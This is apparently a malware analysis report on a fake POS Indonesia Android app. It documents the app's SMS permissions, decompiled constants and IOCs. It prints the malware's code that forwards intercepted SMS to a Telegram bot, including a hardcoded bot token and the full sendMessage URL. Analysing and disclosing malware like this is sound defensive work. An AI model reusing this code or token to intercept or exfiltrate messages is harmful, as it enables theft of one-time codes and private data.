# 🐟 Malware Analysis Report: Fake POS_Indonesia.apk

## 🔍 Summary
This analysis covers a fake version of the PT_POS_Indonesia.apk, impersonating the legitimate POS Indonesia app from PT Pos Indonesia. Unlike the official app, this variant was found outside authorized app stores and exhibits malicious behavior including SMS interception and data exfiltration via Telegram API.

---

## 📦 File Information

- **Filename:** PT POS Indonesia -2_3.apk
- **SHA-256:** `A07BCC68923CCA9C37A60A5A059C0D9393190A56BED2519E6C4508BF7314A459`
- **Package Name:** `com.smodj.app.smstotelegram`, `com.bajingan.bangsat`
- **Size:** ~5MB (exact size may vary)
- **Detection:** Manual Detection using Tools.

---

## 📱 Requested Permissions

```xml
<uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

```


## 🔐 Hardcoded Secrets (Telegram Bot API)
```xml
 public static final String TAG = "sms_to_telegram_job";
    public static final String api_key = "AhD93-SmJ92-JnD92-SnH93-NvD92";
    private static final String bot_id = "524698781:AAEWJi_ufuZA4Pc8_5Uot83WWLUtCHoIndY";
    public static final String bot_id_key = "BotID";

```
## 🕵️ Malicious Behavior Overview 
```xml
public class MainConstant {
    public static final String TAG = "sms_to_telegram_job";
    public static final String api_key = "AhD93-SmJ92-JnD92-SnH93-NvD92";
    private static final String bot_id = "524698781:AAEWJi_ufuZA4Pc8_5Uot83WWLUtCHoIndY";
    public static final String bot_id_key = "BotID";
    public static boolean database_lock = false;
    public static final String database_name = "SMStoTelegram";
    public static final String database_table = "offline_msgs";
    public static final int database_version = 1;
    public static final String device_name_key = "DeviceName";
    public static final String manual_url = "https://smj.ltd/smstotelegram/instructions";
    public static final String pkg = "com.smodj.app.smstotelegram";
    public static final String preformat_key = "preMsg";
    public static final String privacy_policy = "PrivacyPolicy";
    public static final String privacy_policy_content = "1. This app forwards SMS to Telegram API Directly.\n2. This app reads all your incoming SMS.\n3. We do NOT store or log any messages, in fact there is no middle layer or servers involved.\n4. All the messages are sent over SSL.\n5. This Project is Open Sourced.\n6. Read more in Settings -> Privacy Policy Option";
    public static final String privacy_policy_url = "https://smj.ltd/smstotelegram/privacy";
    public static final String register_device_url_fallback = "https://api.smj.ltd/smstotelegram/register";
    public static final String remoteSMS_key = "remoteSMS";
    public static final String send_url_key = "SendUrl";
    public static final String silent_key = "silentID";
    public static final String support_url = "https://t.me/smstotelegram";
    public static final String telegram_id_storage_key = "TelegramID";
    public static String telegram_url = "";
    public static final String token = "FireBaseDeviceID";
    public static final String unsent_msgs_stack = "DELAYED_STACK";
    public static final String welcome_slides = "WelcomeSlides";

    public static String getURL(Context context) {
        String readKey = new Storage(context).readKey(bot_id_key);
        if (readKey.equals("Default")) {
            readKey = bot_id;
        }
        telegram_url = "https://api.telegram.org/bot" + readKey + "/sendMessage";
        return telegram_url;
    }

```

Heres the funny part
![image](https://github.com/user-attachments/assets/2ca5c1ee-d559-42a5-b2d4-b4b7105d6ea0)
![image](https://github.com/user-attachments/assets/917e264c-67f3-4091-9fd4-82d0f284d64a)
![image](https://github.com/user-attachments/assets/2290d52c-5533-4c87-ac05-c2ec298f9fe6)



## 🧠 App Settings (Suspicious UI Fragments)
```xml
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">
    <PreferenceCategory android:title="Mandatory">
        <Preference
            android:title="Telegram ID"
            android:key="TelegramID"
            android:summary="Messages will be forwarded to this ID, it can be a Telegram ID or a Group ID."/>
    </PreferenceCategory>
    <PreferenceCategory android:title="Optional">
        <Preference
            android:title="Device Name"
            android:key="DeviceName"
            android:summary="Use a friendly name, example: MyPhone"/>
        <SwitchPreference
            android:title="Remote SMS"
            android:key="remoteSMS"
            android:summary="This allows SMS to be sent from this device using Bot, Note: this option registers your device info on our servers."
            android:defaultValue="true"/>
        <SwitchPreference
            android:title="Send Silently"
            android:key="silentID"
            android:summary="Sends the messages silently. You will receive a notification but no sound."
            android:defaultValue="false"/>
        <SwitchPreference
            android:title="Pre-formatted Messages"
            android:key="preMsg"
            android:summary="Pre-format a message for easy copy."
            android:defaultValue="false"/>
        <Preference
            android:title="Bot Token"
            android:key="BotID"
            android:summary="If you are using custom bot."/>
        <Preference
            android:title="Grant Permissions"
            android:key="grantPermissions"
            android:summary="Grant Read SMS and Send SMS. Ignore if already"/>
        <Preference
            android:title="Manual"
            android:key="Help"
            android:summary="A simple guide to use this app."/>
        <Preference
            android:title="Reset"
            android:key="reset"/>
        <Preference
            android:title="Privacy Policy"
            android:key="Privacy"/>
        <Preference
            android:title="About"
            android:key="About">
            <intent
                android:targetPackage="com.smodj.app.smstotelegram"
                android:targetClass="com.smodj.app.smstotelegram.AboutActivity"/>
        </Preference>
    </PreferenceCategory>
</PreferenceScreen>
```

## Application Permission Except the above
```xml
public static final String APP_STATE = "https://www.googleapis.com/auth/appstate";
    public static final String CLOUD_SAVE = "https://www.googleapis.com/auth/datastoremobile";
    public static final String DRIVE_APPFOLDER = "https://www.googleapis.com/auth/drive.appdata";

    @KeepForSdk
    public static final String DRIVE_APPS = "https://www.googleapis.com/auth/drive.apps";
    public static final String DRIVE_FILE = "https://www.googleapis.com/auth/drive.file";

    @KeepForSdk
    public static final String DRIVE_FULL = "https://www.googleapis.com/auth/drive";
    public static final String EMAIL = "email";
    public static final String FITNESS_ACTIVITY_READ = "https://www.googleapis.com/auth/fitness.activity.read";
    public static final String FITNESS_ACTIVITY_READ_WRITE = "https://www.googleapis.com/auth/fitness.activity.write";

    @KeepForSdk
    public static final String FITNESS_BLOOD_GLUCOSE_READ = "https://www.googleapis.com/auth/fitness.blood_glucose.read";

    @KeepForSdk
    public static final String FITNESS_BLOOD_GLUCOSE_READ_WRITE = "https://www.googleapis.com/auth/fitness.blood_glucose.write";

    @KeepForSdk
    public static final String FITNESS_BLOOD_PRESSURE_READ = "https://www.googleapis.com/auth/fitness.blood_pressure.read";

    @KeepForSdk
    public static final String FITNESS_BLOOD_PRESSURE_READ_WRITE = "https://www.googleapis.com/auth/fitness.blood_pressure.write";
    public static final String FITNESS_BODY_READ = "https://www.googleapis.com/auth/fitness.body.read";
    public static final String FITNESS_BODY_READ_WRITE = "https://www.googleapis.com/auth/fitness.body.write";

    @KeepForSdk
    public static final String FITNESS_BODY_TEMPERATURE_READ = "https://www.googleapis.com/auth/fitness.body_temperature.read";

    @KeepForSdk
    public static final String FITNESS_BODY_TEMPERATURE_READ_WRITE = "https://www.googleapis.com/auth/fitness.body_temperature.write";
    public static final String FITNESS_LOCATION_READ = "https://www.googleapis.com/auth/fitness.location.read";
    public static final String FITNESS_LOCATION_READ_WRITE = "https://www.googleapis.com/auth/fitness.location.write";
    public static final String FITNESS_NUTRITION_READ = "https://www.googleapis.com/auth/fitness.nutrition.read";
    public static final String FITNESS_NUTRITION_READ_WRITE = "https://www.googleapis.com/auth/fitness.nutrition.write";

    @KeepForSdk
    public static final String FITNESS_OXYGEN_SATURATION_READ = "https://www.googleapis.com/auth/fitness.oxygen_saturation.read";

    @KeepForSdk
    public static final String FITNESS_OXYGEN_SATURATION_READ_WRITE = "https://www.googleapis.com/auth/fitness.oxygen_saturation.write";

    @KeepForSdk
    public static final String FITNESS_REPRODUCTIVE_HEALTH_READ = "https://www.googleapis.com/auth/fitness.reproductive_health.read";

    @KeepForSdk
    public static final String FITNESS_REPRODUCTIVE_HEALTH_READ_WRITE = "https://www.googleapis.com/auth/fitness.reproductive_health.write";
    public static final String GAMES = "https://www.googleapis.com/auth/games";

    @KeepForSdk
    public static final String GAMES_LITE = "https://www.googleapis.com/auth/games_lite";

    @KeepForSdk
    public static final String OPEN_ID = "openid";

    @Deprecated
    public static final String PLUS_LOGIN = "https://www.googleapis.com/auth/plus.login";
    public static final String PLUS_ME = "https://www.googleapis.com/auth/plus.me";
    public static final String PROFILE = "profile";
```

- App State and Cloud Save
- Google Drive
- Fitness / Health
- Email Access
- Open ID
- Google Play Services

## 🛑 Indicators of Compromise (IOCs)

- Package Name : com.smodj.app.smstotelegram, com.bajingan.bangsat
- Bot API URL	: https://api.telegram.org/bot524698781:AAEWJi_ufuZA4Pc8_5Uot83WWLUtCHoIndY/sendMessage
- Permissions	: RECEIVE_SMS, READ_SMS, SEND_SMS, INTERNET ACCESS, IGNORE_BATTERY_OPT, WAKE_LOCK, BIND_GET_INSTALL_REFERRER_SERVICE, c2dm.permission.RECEIVE, RECEIVE_BOOT_COMPLETED
- SHA256 : A07BCC68923CCA9C37A60A5A059C0D9393190A56BED2519E6C4508BF7314A459

## Virus Total 
[Result](https://www.virustotal.com/gui/file/a07bcc68923cca9c37a60a5a059c0d9393190a56bed2519e6c4508bf7314a459/detection)
